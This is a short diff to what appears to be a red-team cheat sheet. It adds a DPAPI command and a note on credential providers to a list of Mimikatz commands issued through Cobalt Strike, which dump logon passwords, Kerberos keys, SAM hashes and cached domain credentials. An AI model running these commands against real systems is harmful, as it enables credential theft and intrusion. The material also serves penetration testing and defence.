@@ -1,7 +1,9 @@
 ### Cobalt Strike
+logonpasswords contains msv,tspkg,wdigest,kerberos,ssp,credman,cloudap.
 ```powershell
 mimikatz !sekurlsa::logonpasswords
 mimikatz !sekurlsa::ekeys
+mimikatz !sekurlsa::dpapi
 mimikatz !lsadump::sam
 mimikatz !lsadump::cache
 
